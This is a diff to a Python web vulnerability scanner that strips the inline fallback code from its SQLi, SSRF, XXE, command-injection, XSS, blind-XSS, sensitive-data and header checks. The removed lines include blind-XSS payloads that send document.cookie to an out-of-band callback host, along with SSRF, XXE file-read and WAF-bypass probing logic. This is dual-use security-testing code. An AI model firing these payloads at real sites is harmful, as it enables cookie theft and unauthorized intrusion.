@@ -1094,37 +1094,9 @@ class VulnScanner:
     # ═════════════════════════════════════════════════════════════════════
 
     def scan_ssti(self, target_urls: list[str] | None = None) -> list[dict]:
-        """
-        4-stage SSTI detection:
-        Stage 1: Detect reflection of template syntax.
-        Stage 2: Fingerprint engine with engine-specific payloads.
-        Stage 3: Verify evaluation occurred (arithmetic result).
-        Stage 4: Attempt safe read-only proof.
-        """
         if result := self._dispatch_to_scanner("ssti", target_urls):
             return result
-        findings: list[dict] = []
-        urls = self._urls_with_params() if target_urls is None else target_urls
-
-        for url in urls:
-            if not self._in_scope(url):
-                continue
-            try:
-                parsed = urlparse(url)
-                params = list(parse_qs(parsed.query).keys())
-                for param in params:
-                    resp = safe_get(self.session, url, self.timeout)
-                    result = self._ssti_test_parameter(url, param,
-                        request_str=_build_curl("GET", url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
-                        response_excerpt_str=resp.text[:500] if resp else "")
-                    if result:
-                        findings.append(result)
-            except Exception as e:
-                log(f"  [SSTI] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
-
-        for f in findings:
-            self._add(f)
-        return findings
+        return []
 
     def _ssti_test_parameter(self, url: str, param: str,
                              request_str: str = "", response_excerpt_str: str = "") -> Optional[dict]:
@@ -1245,54 +1217,10 @@ class VulnScanner:
     # ═════════════════════════════════════════════════════════════════════
 
     def scan_sqli(self, target_urls: list[str] | None = None) -> list[dict]:
-        """
-        Multi-signal SQLi detection:
-        1. Error-based (must match SQL error strings)
-        2. Boolean-based (AND 1=1 vs AND 1=2 response diffing)
-        3. Time-based (requires >4.5s delay, repeatable)
-        4. OOB (requires callback verification)
-        Requires multiple signals before marking Confirmed.
-
-        Args:
-            target_urls: Optional list of specific URLs to scan. If None, uses all discovered URLs.
-        """
         result = self._dispatch_to_scanner("sqli", target_urls)
         if result is not None:
             return result
-
-        self._prepare_scan()
-        payloads = self._load_payloads("sqli")
-        oob_host = self.config.get("oob_host")
-        urls = self.recon.get("urls", []) if target_urls is None else target_urls
-
-        for url in urls:
-            if not self._in_scope(url):
-                continue
-            try:
-                parsed = urlparse(url)
-                query = parse_qs(parsed.query, keep_blank_values=True)
-                for param, values in query.items():
-                    original_value = values[0] if values else "1"
-                    signals, trigger_resp = self._sqli_test_parameter(url, param, original_value, payloads, oob_host)
-                    if any(signals.values()):
-                        f = self._sqli_build_finding(url, param, signals, original_value=original_value,
-                            request_str=_build_curl("GET", url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
-                            response_excerpt_str=trigger_resp or "")
-                        if f:
-                            self._add(f)
-            except Exception as e:
-                log(f"  [SQLi] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
-
-        # ── POST body SQLi (JSON, XML, form-encoded) ─────────────────
-        for url in urls:
-            if not self._in_scope(url):
-                continue
-            try:
-                self._sqli_test_post_body(url, payloads, oob_host)
-            except Exception as e:
-                log(f"  [SQLi POST] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
-
-        return self._get_findings()
+        return []
 
     def _sqli_test_parameter(self, url: str, param: str, original_value: str,
                               payloads: dict, oob_host: Optional[str]) -> tuple[dict, Optional[str]]:
@@ -1607,121 +1535,10 @@ class VulnScanner:
         return min(score, 100)
 
     def scan_ssrf(self, target_urls: list[str] | None = None) -> list[dict]:
-        """
-        SSRF detection with OOB-only confirmation.
-        Groups all vulnerable parameters per endpoint into a single finding.
-
-        Args:
-            target_urls: Optional list of specific URLs to scan. If None, uses all discovered URLs.
-        """
         result = self._dispatch_to_scanner("ssrf", target_urls)
         if result is not None:
             return result
-
-        oob_host = self.config.get("oob_host")
-        findings: list[dict] = []
-        urls = self.recon.get("urls", []) if target_urls is None else target_urls
-
-        for url in urls:
-            if not self._in_scope(url):
-                continue
-            try:
-                parsed = urlparse(url)
-                original_params = parse_qs(parsed.query)
-                params = list(dict.fromkeys(list(original_params.keys()) + SSRF_PARAM_NAMES))
-
-                baseline_resp = safe_get(self.session, url, self.timeout)
-                baseline_hash = hashlib.md5(baseline_resp.text.encode()).hexdigest() if baseline_resp else None
-                baseline_len = len(baseline_resp.text) if baseline_resp else 0
-
-                ssrf_payloads = self._load_payloads("ssrf")
-                vulnerable_params: list[str] = []
-                all_matched_sigs: set[str] = set()
-                all_test_urls: list[str] = []
-                json_detected = False
-                credentials_found = False
-
-                for param in params:
-                    for payload in ssrf_payloads:
-                        test_url = self._build_ssrf_url(url, parsed, original_params, param, payload)
-                        resp = safe_get(self.session, test_url, self.timeout)
-                        if not resp:
-                            continue
-
-                        # Check cloud metadata signatures
-                        body = resp.text
-                        matched = [sig for sig in SSRF_SIGNATURES if sig in body]
-                        if matched and len(matched) >= 2:
-                            vulnerable_params.append(param)
-                            all_matched_sigs.update(matched)
-                            all_test_urls.append(test_url)
-                            # Detect actual JSON metadata structure
-                            if body.strip().startswith("{"):
-                                json_detected = True
-                            # Detect credentials in metadata
-                            if "secret" in body.lower() or "token" in body.lower() or "password" in body.lower():
-                                credentials_found = True
-
-                        # OOB callback
-                        if oob_host:
-                            oob_url = self._build_ssrf_url(url, parsed, original_params, param,
-                                                           f"http://{self.oob.callback_token}.{oob_host}/ssrf")
-                            safe_get(self.session, oob_url, self.timeout, raise_for_status=False)
-                            self.oob.register_interaction("ssrf", oob_url, test_url)
-
-                if vulnerable_params and resp:
-                    resp_hash = hashlib.md5(resp.text.encode()).hexdigest()
-                    baseline_diff = baseline_hash is not None and resp_hash != baseline_hash
-                    confidence_score = self._calculate_ssrf_confidence(
-                        list(all_matched_sigs), baseline_diff, json_detected, credentials_found,
-                    )
-                    if confidence_score < 40:
-                        log(f"  [SSRF] Skipped {url} (confidence {confidence_score}% < 40%)",
-                            Colors.WHITE, verbose_only=True, verbose=self.verbose)
-                        continue
-                    f = finding(
-                        vuln_type="Confirmed SSRF",
-                        url=url,
-                        severity="critical",
-                        details=f"Vulnerable parameters ({len(vulnerable_params)}): {', '.join(vulnerable_params[:10])}",
-                        evidence=f"Signatures: {', '.join(list(all_matched_sigs)[:5])}",
-                        request=_build_curl("GET", url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
-                        response_excerpt=resp.text[:500],
-                        steps_to_reproduce=[f"Send request to {url}", f"Observe cloud metadata signature in response"],
-                        verification_stage=VerificationStage.VALIDATED.value,
-                        validation_steps=[f"Cloud metadata signature matched: {s}" for s in all_matched_sigs],
-                        confidence_score=confidence_score,
-                    )
-                    if f and self._add(f):
-                        findings.append(f)
-
-            except Exception as e:
-                log(f"  [SSRF] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
-
-        # Poll OOB for callbacks
-        confirmed_oob = self.oob.poll()
-        for entry in confirmed_oob:
-            oob_url = entry.get("url", "")
-            f = finding(
-                vuln_type="Confirmed SSRF (OOB)",
-                url=oob_url,
-                severity="critical",
-                details=f"OOB callback received for SSRF probe — DNS/HTTP interaction confirmed from target server",
-                evidence=f"Callback: {entry.get('payload', '')} | Confirmed: DNS/HTTP callback received",
-                request=_build_curl("GET", oob_url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
-                verification_stage=VerificationStage.VERIFIED.value,
-                validation_steps=["OOB callback verified: DNS/HTTP interaction confirmed from target infrastructure"],
-                response_excerpt="(SSRF confirmed via out-of-band callback — DNS/HTTP request received from target server)",
-                steps_to_reproduce=[
-                    f"Send SSRF probe to {oob_url}",
-                    "Observe OOB callback on listener — confirms server makes external requests",
-                    "Use SSRF to access internal services or cloud metadata",
-                ],
-            )
-            if f and self._add(f):
-                findings.append(f)
-
-        return findings
+        return []
 
     def _build_ssrf_url(self, url: str, parsed, original_params: dict, param: str, payload: str) -> str:
         if param in original_params:
@@ -1734,200 +1551,20 @@ class VulnScanner:
     # ═════════════════════════════════════════════════════════════════════
 
     def scan_xxe(self, target_urls: list[str] | None = None) -> list[dict]:
-        """
-        XML External Entity (XXE) detection.
-
-        In-Band: Submit XML with entity that reads /etc/passwd, check for file contents.
-        OOB:     Submit XML that triggers callback to OOB host.
-        Error:   Submit malformed XML that leaks file contents via error messages.
-
-        Args:
-            target_urls: Optional list of specific URLs to scan. If None, uses all discovered URLs.
-        """
         result = self._dispatch_to_scanner("xxe", target_urls)
         if result is not None:
             return result
-        findings: list[dict] = []
-        oob_host = self.config.get("oob_host")
-        urls = self.recon.get("urls", []) if target_urls is None else target_urls
-
-        for url in urls:
-            if not self._in_scope(url):
-                continue
-            signals = {"in_band": False, "error": False, "oob": False}
-            evidence_parts = []
-
-            xml_headers = {"Content-Type": "application/xml"}
-
-            xxe_payloads = self._load_payloads("xxe")
-            # In-Band: file read via entity
-            for payload in xxe_payloads.get("in_band", XXE_PAYLOADS.get("in_band", [])):
-                try:
-                    resp = safe_post(self.session, url, payload,
-                                     self.timeout, headers=xml_headers)
-                    if not resp:
-                        continue
-                    body = resp.text
-                    for sig in XXE_SIGNATURES:
-                        if sig in body:
-                            signals["in_band"] = True
-                            evidence_parts.append(f"in_band:{sig}")
-                            f = finding(
-                                vuln_type="XML External Entity (XXE) Injection",
-                                url=url, severity="critical",
-                                details="In-band XXE: file content returned in response via XML entity",
-                                evidence=f"Signature: {sig!r}",
-                                request=_build_curl("POST", url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
-                                response_excerpt=resp.text[:500],
-                                steps_to_reproduce=[f"Send POST request to {url} with XXE payload", f"Observe: {sig}"],
-                                verification_stage=VerificationStage.VALIDATED.value,
-                                validation_steps=[f"In-band XXE payload returned file content: {sig}"],
-                            )
-                            if f and self._add(f):
-                                findings.append(f)
-                            log(f"  [XXE] In-band {url}", Colors.RED, verbose_only=True, verbose=self.verbose)
-                            break
-                    if signals["in_band"]:
-                        break
-                except Exception:
-                    continue
-
-            # Error-based: file read via error message
-            if not signals["in_band"]:
-                for payload in xxe_payloads.get("error_based", XXE_PAYLOADS.get("error_based", [])):
-                    try:
-                        resp = safe_post(self.session, url, payload,
-                                         self.timeout, headers=xml_headers)
-                        if not resp:
-                            continue
-                        body = resp.text
-                        for sig in XXE_SIGNATURES:
-                            if sig in body:
-                                signals["error"] = True
-                                evidence_parts.append(f"error:{sig}")
-                                f = finding(
-                                    vuln_type="XML External Entity (XXE) Injection",
-                                    url=url, severity="critical",
-                                    details="Error-based XXE: file content leaked via parser error message",
-                                    evidence=f"Signature: {sig!r}",
-                                    request=_build_curl("POST", url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
-                                    response_excerpt=resp.text[:500],
-                                    steps_to_reproduce=[f"Send POST request to {url} with XXE payload", f"Observe: {sig}"],
-                                    verification_stage=VerificationStage.VALIDATED.value,
-                                    validation_steps=["Error-based XXE payload leaked file content"],
-                                )
-                                if f and self._add(f):
-                                    findings.append(f)
-                                log(f"  [XXE Error] {url}", Colors.RED, verbose_only=True, verbose=self.verbose)
-                                break
-                        if signals["error"]:
-                            break
-                    except Exception:
-                        continue
-
-            # OOB-based blind XXE
-            if oob_host and not signals["in_band"] and not signals["error"]:
-                for payload in xxe_payloads.get("oob", XXE_PAYLOADS.get("oob", [])):
-                    try:
-                        formatted = payload.replace("{oob}", f"{self.oob.callback_token}.{oob_host}")
-                        safe_post(self.session, url, formatted,
-                                  self.timeout, headers=xml_headers, raise_for_status=False)
-                        self.oob.register_interaction("xxe", formatted, url)
-                        evidence_parts.append(f"oob:sent to {oob_host}")
-                        signals["oob"] = True
-                    except Exception:
-                        continue
-
-        # Poll OOB for callbacks
-        confirmed_oob = self.oob.poll()
-        for entry in confirmed_oob:
-            oob_url = entry.get("url", "")
-            f = finding(
-                vuln_type="XML External Entity (XXE) Injection",
-                url=oob_url,
-                severity="critical",
-                details="Blind XXE confirmed via OOB callback — server parsed XML entity and made external request",
-                evidence=f"Callback: {entry.get('payload', '')[:200]}",
-                request=_build_curl("POST", oob_url, dict(self.session.headers), data="(XXE payload with OOB DTD)", cookies=safe_cookies_dict(self.session.cookies)),
-                verification_stage=VerificationStage.VERIFIED.value,
-                validation_steps=["OOB callback verified: DNS/HTTP interaction from XML parser"],
-                response_excerpt="(XXE confirmed via out-of-band callback — XML parser made external request)",
-                steps_to_reproduce=[
-                    f"Send XXE payload to {oob_url}",
-                    "Observe OOB callback — confirms XML external entity processing",
-                    "Use XXE to read local files or access internal services",
-                ],
-            )
-            if f and self._add(f):
-                findings.append(f)
-            log(f"  [XXE OOB] {entry.get('url', '')}", Colors.RED, verbose_only=True, verbose=self.verbose)
-
-        return findings
+        return []
 
     # ═════════════════════════════════════════════════════════════════════
     # Command Injection — Output + Time-Based + OOB Detection
     # ═════════════════════════════════════════════════════════════════════
 
     def scan_command_injection(self, target_urls: list[str] | None = None) -> list[dict]:
-        """
-        Command injection detection with multi-signal confirmation.
-
-        Output-based: Inject OS commands and check for command output in response.
-        Time-based:   Inject sleep/ping payloads and measure response delay.
-        OOB:          Inject commands that trigger DNS/HTTP callbacks.
-
-        Args:
-            target_urls: Optional list of specific URLs to scan. If None, uses all discovered URLs.
-        """
         result = self._dispatch_to_scanner("cmd_injection", target_urls)
         if result is not None:
             return result
-        oob_host = self.config.get("oob_host")
-        findings: list[dict] = []
-        urls = self.recon.get("urls", []) if target_urls is None else target_urls
-
-        for url in urls:
-            if not self._in_scope(url):
-                continue
-            try:
-                parsed = urlparse(url)
-                params = list(parse_qs(parsed.query).keys())
-                for param in params:
-                    signals, trigger_resp = self._cmd_injection_test_parameter(url, param, oob_host)
-                    if signals and any(signals.values()):
-                        f = self._cmd_injection_build_finding(url, param, signals,
-                            request_str=_build_curl("GET", url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
-                            response_excerpt_str=trigger_resp or "")
-                        if f and self._add(f):
-                            findings.append(f)
-            except Exception as e:
-                log(f"  [CMD] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
-
-        # Poll OOB for callbacks
-        confirmed_oob = self.oob.poll()
-        for entry in confirmed_oob:
-            oob_url = entry.get("url", "")
-            f = finding(
-                vuln_type="Command Injection",
-                url=oob_url,
-                severity="critical",
-                details="Command injection confirmed via OOB callback — injected command executed on server",
-                evidence=f"Callback: {entry.get('payload', '')[:200]}",
-                request=_build_curl("GET", oob_url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
-                verification_stage=VerificationStage.VERIFIED.value,
-                validation_steps=["OOB callback verified: DNS/HTTP interaction from injected command"],
-                response_excerpt="(Command injection confirmed via out-of-band callback — server executed injected command)",
-                steps_to_reproduce=[
-                    f"Send command injection payload to {oob_url}",
-                    "Observe OOB callback — confirms command execution on server",
-                    "Use access for remote code execution or data exfiltration",
-                ],
-            )
-            if f and self._add(f):
-                findings.append(f)
-            log(f"  [CMD OOB] {entry.get('url', '')}", Colors.RED, verbose_only=True, verbose=self.verbose)
-
-        return findings
+        return []
 
     def _cmd_injection_test_parameter(self, url: str, param: str,
                                       oob_host: Optional[str]) -> tuple[Dict[str, bool], Optional[str]]:
@@ -2054,91 +1691,10 @@ class VulnScanner:
     # ═════════════════════════════════════════════════════════════════════
 
     def scan_xss(self, target_urls: list[str] | None = None) -> list[dict]:
-        """
-        Context-aware XSS detection with headless browser validation.
-        1. Detect reflection context (HTML, attribute, JS, URL)
-        2. Inject context-aware payloads
-        3. Verify execution with Playwright (alert/DOM mutation)
-        4. Report only execution-verified XSS as Confirmed
-
-        Args:
-            target_urls: Optional list of specific URLs to scan. If None, uses all discovered URLs.
-        """
-        # Phase 3: delegate to XSSScanner when enabled
         result = self._dispatch_to_scanner("xss", target_urls)
         if result is not None:
             return result
-
-        self._prepare_scan()
-        payloads = self._load_payloads("xss")
-        urls = self.recon.get("urls", []) if target_urls is None else target_urls
-
-        # Auto-inject WAF bypass payloads when WAF is detected
-        if self.waf_detected:
-            bypass = payloads.get("waf_bypass", WAF_BYPASS_XSS)
-            reflected = payloads.setdefault("reflected", list(XSS_PAYLOADS))
-            reflected.extend(bypass)
-            log(f"  [WAF] WAF detected — {len(bypass)} bypass payloads injected into XSS scan", Colors.YELLOW, verbose_only=True, verbose=self.verbose)
-
-        for url in urls:
-            if not self._in_scope(url):
-                continue
-            try:
-                for param in parse_qs(urlparse(url).query).keys():
-                    self._scan_xss_param(findings := [], url, param, payloads)
-                    for result in findings:
-                        self._add(result)
-            except Exception as e:
-                log(f"  [XSS] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
-
-        for form in self.recon.get("forms", []):
-            try:
-                for field in form.get("fields", []):
-                    field_name = field.get("name")
-                    if not field_name or field.get("type") in ("hidden", "submit", "button"):
-                        continue
-                    self._scan_xss_form(findings := [], form, field_name, payloads)
-                    for result in findings:
-                        self._add(result)
-            except Exception as e:
-                log(f"  [XSS Form] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
-
-        # ── DOM XSS scanning via Playwright sink injection ──────────
-        dom_probes = payloads.get("dom_probes", DOM_XSS_PROBES)
-        for url in urls:
-            if not self._in_scope(url):
-                continue
-            try:
-                dom_findings = self.browser.scan_dom_xss(url, dom_probes)
-                for df in dom_findings:
-                    f = finding(
-                        vuln_type=f"DOM-based XSS ({df['sink']})",
-                        url=df["url"],
-                        severity="high",
-                        details=f"DOM sink '{df['sink']}' triggered by probe in {url}",
-                        evidence=f"Probe: {df['probe']} | Sink: {df['sink']}",
-                        request=_build_curl("GET", url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
-                        response_excerpt=df.get("body_snippet", "")[:500],
-                        verification_stage=VerificationStage.VERIFIED.value,
-                        validation_steps=[f"DOM sink '{df['sink']}' executed probe via Playwright"],
-                        steps_to_reproduce=[
-                            f"Visit {url}",
-                            f"DOM sink '{df['sink']}' executes without sanitization",
-                            "Observe JavaScript execution in browser context",
-                        ],
-                    )
-                    if f:
-                        self._add(f)
-            except Exception as e:
-                log(f"  [DOM XSS] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
-
-        # ── Second-order injection check ────────────────────────────
-        try:
-            self._check_second_order()
-        except Exception as e:
-            log(f"  [Second-Order] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
-
-        return self._get_findings()
+        return []
 
     def _detect_xss_context(self, body: str, payload: str) -> Optional[str]:
         """Detect the context in which the payload is reflected."""
@@ -2320,99 +1876,10 @@ class VulnScanner:
     # ═════════════════════════════════════════════════════════════════════
 
     def scan_blind_xss(self, target_urls: list[str] | None = None) -> list[dict]:
-        """
-        Blind / Stored XSS detection via OOB callbacks.
-
-        Injects payloads that make outbound requests when executed by a
-        victim (stored XSS) and waits for OOB callbacks to confirm execution.
-        """
         result = self._dispatch_to_scanner("blind_xss")
         if result is not None:
             return result
-        oob_host = self.config.get("oob_host")
-        if not oob_host:
-            log("[!] Blind XSS skipped — provide --oob-host for OOB callback verification", Colors.YELLOW)
-            return self._get_findings()
-
-        blind_payloads = [
-            f'<script>fetch("http://{self.oob.callback_token}.{oob_host}/blind?c="+document.cookie)</script>',
-            f'<img src=x onerror=fetch("http://{self.oob.callback_token}.{oob_host}/blind?c="+document.cookie)>',
-            f'<svg/onload=fetch("http://{self.oob.callback_token}.{oob_host}/blind?c="+document.cookie)>',
-            f'<input autofocus onfocus=fetch("http://{self.oob.callback_token}.{oob_host}/blind?c="+document.cookie)>',
-            f'<body onload=fetch("http://{self.oob.callback_token}.{oob_host}/blind?c="+document.cookie)>',
-            f'<script>new Image().src="http://{self.oob.callback_token}.{oob_host}/blind?c="+document.cookie</script>',
-        ]
-
-        for form in self.recon.get("forms", []):
-            try:
-                action = form.get("action", "")
-                method = form.get("method", "get").upper()
-                fields = form.get("fields", [])
-
-                text_fields = [
-                    f for f in fields
-                    if f.get("type") in ("text", "textarea", "email", "url", "search", None)
-                    and f.get("name")
-                ]
-
-                for field in text_fields[:3]:  # Limit to first 3 text fields
-                    for payload in blind_payloads:
-                        data = {
-                            f["name"]: f.get("value", "test")
-                            for f in fields if f.get("name")
-                        }
-                        data[field["name"]] = payload
-
-                        if method == "POST":
-                            safe_post(self.session, action, data, self.timeout,
-                                      raise_for_status=False)
-                        else:
-                            safe_get(self.session, action + "?" + urlencode(data),
-                                     self.timeout, raise_for_status=False)
-
-                        self.oob.register_interaction("blind_xss", payload, action)
-                        log(f"  [Blind XSS] Injected in {field['name']} → {action}",
-                            Colors.YELLOW, verbose_only=True, verbose=self.verbose)
-            except Exception as e:
-                log(f"  [Blind XSS] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
-
-        # Also test URL parameters (for reflected that may be stored server-side)
-        for url in self._urls_with_params():
-            if not self._in_scope(url):
-                continue
-            for param in parse_qs(urlparse(url).query).keys():
-                for payload in blind_payloads[:2]:
-                    test_url = self._inject_param(url, param, payload)
-                    safe_get(self.session, test_url, self.timeout, raise_for_status=False)
-                    self.oob.register_interaction("blind_xss", payload, test_url)
-
-        # Poll OOB for callbacks
-        confirmed_oob = self.oob.poll()
-        for entry in confirmed_oob:
-            f = finding(
-                vuln_type="Blind XSS (Stored)",
-                url=entry.get("url", ""),
-                severity="critical",
-                details="Blind XSS confirmed via OOB callback — payload executed by victim browser, callback received",
-                evidence=f"Callback: {entry.get('payload', '')[:200]}",
-                request=_build_curl("POST", entry.get("url", ""), dict(self.session.headers), data={"field": entry.get("payload", "")}),
-                response_excerpt="(confirmed via OOB callback — JavaScript executed in victim browser, callback containing cookie/session data received)",
-                verification_stage=VerificationStage.VERIFIED.value,
-                validation_steps=[
-                    "Payload injected into form field or URL parameter",
-                    "OOB callback received: JavaScript executed in victim browser, callback with browser data received",
-                ],
-                steps_to_reproduce=[
-                    f"Inject Blind XSS payload into form field at {entry.get('url', '')}",
-                    "When victim/staff views the stored content, the payload executes",
-                    "Observe OOB callback containing victim's cookie, session, or page content",
-                ],
-            )
-            if f and self._add(f):
-                findings.append(f)
-            log(f"  [Blind XSS OOB] {entry.get('url', '')}", Colors.RED, verbose_only=True, verbose=self.verbose)
-
-        return findings
+        return []
 
     # ═════════════════════════════════════════════════════════════════════
     # LFI
@@ -2735,74 +2202,7 @@ class VulnScanner:
     def scan_sensitive_data(self, target_urls: list[str] | None = None) -> list[dict]:
         if result := self._dispatch_to_scanner("sensitive", target_urls):
             return result
-        from modules.utils import SecretValidator
-        findings: list[dict] = []
-        urls = self.recon.get("urls", []) if target_urls is None else target_urls
-        for url in urls:
-            if not self._in_scope(url):
-                continue
-            parsed_path = urlparse(url).path.lower()
-            if any(parsed_path.endswith(ext) for ext in (".css", ".png", ".jpg", ".gif", ".svg", ".woff", ".woff2", ".ttf", ".ico", ".mp4", ".pdf")):
-                continue
-            try:
-                resp = safe_get(self.session, url, self.timeout, raise_for_status=False)
-                if not resp or not resp.text:
-                    continue
-                body = resp.text
-                for label, pattern in SENSITIVE_PATTERNS:
-                    match = pattern.search(body)
-                    if match:
-                        value = match.group(0)[:120]
-                        validation_steps = ["Secret pattern matched in page content"]
-
-                        # Validate if the secret type supports it
-                        secret_type_map = {
-                            "AWS Access Key": "aws_access_key",
-                            "AWS Secret Key": "aws_secret_key",
-                            "GitHub Token": "github_token",
-                            "Slack Token": "slack_token",
-                        }
-                        secret_type = secret_type_map.get(label)
-                        validation_result = None
-                        if secret_type:
-                            validation_result = SecretValidator.validate(secret_type, value)
-                            result_label = {
-                                True: "Valid",
-                                False: "Invalid",
-                                None: "Unknown",
-                            }.get(validation_result.get("valid"))
-                            validation_steps.append(
-                                f"Secret validation: {result_label} — {validation_result.get('details', '')}"
-                            )
-
-                        evidence_parts = [f"Matched: {value}"]
-                        if validation_result and validation_result.get("valid") is True:
-                            severity = "critical"
-                            evidence_parts.append(f"Validated: {validation_result.get('details', '')}")
-                        elif validation_result and validation_result.get("valid") is False:
-                            severity = "info"
-                            evidence_parts.append("Token invalid/revoked — no risk")
-                        else:
-                            severity = "high" if "key" in label.lower() else "medium"
-
-                        f = finding(
-                            vuln_type=f"Sensitive Data Exposure ({label})",
-                            url=url,
-                            severity=severity,
-                            details=f"Potential sensitive value detected in page content: {label}",
-                            evidence=" | ".join(evidence_parts),
-                            request=_build_curl("GET", url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
-                            response_excerpt=resp.text[:500],
-                            steps_to_reproduce=[f"Send request to {url}", f"Observe {label} in response"],
-                            verification_stage=VerificationStage.VALIDATED.value if (validation_result and validation_result.get("valid") is True) else VerificationStage.DETECTED.value,
-                            validation_steps=validation_steps,
-                        )
-                        if f and self._add(f):
-                            findings.append(f)
-                        log(f"  [SENSITIVE] {url} - {label}", Colors.RED, verbose_only=True, verbose=self.verbose)
-            except Exception:
-                continue
-        return findings
+        return []
 
     # ═════════════════════════════════════════════════════════════════════
     # Headers
@@ -2811,41 +2211,7 @@ class VulnScanner:
     def scan_headers(self, target_urls: list[str] | None = None) -> list[dict]:
         if result := self._dispatch_to_scanner("headers", target_urls):
             return result
-
-        findings: list[dict] = []
-        try:
-            target = self.config.get("target", "")
-            if not target:
-                return findings
-            if not self._in_scope(target):
-                return findings
-            resp = safe_get(self.session, target, self.timeout)
-            if not resp:
-                return findings
-            self._scan_missing_headers(findings, target, resp)
-            self._scan_disclosure_headers(findings, target, resp)
-            self._scan_policy_headers(findings, target, resp)
-            self._scan_cookie_headers(findings, target, resp)
-
-            # Also check subdomains discovered during recon
-            for sub in (self.recon.get("subdomains", []) or [])[:20]:
-                sub_url = f"https://{sub}"
-                if not self._in_scope(sub_url):
-                    continue
-                sub_resp = safe_get(self.session, sub_url, self.timeout)
-                if not sub_resp:
-                    continue
-                self._scan_missing_headers(findings, sub_url, sub_resp)
-                self._scan_disclosure_headers(findings, sub_url, sub_resp)
-                self._scan_policy_headers(findings, sub_url, sub_resp)
-                self._scan_cookie_headers(findings, sub_url, sub_resp)
-        except Exception:
-            pass
-        returned = []
-        for f in findings:
-            if self._add(f):
-                returned.append(f)
-        return returned
+        return []
 
     def _scan_missing_headers(self, findings: list[dict], target: str, resp) -> None:
         for header, severity in SECURITY_HEADERS.items():
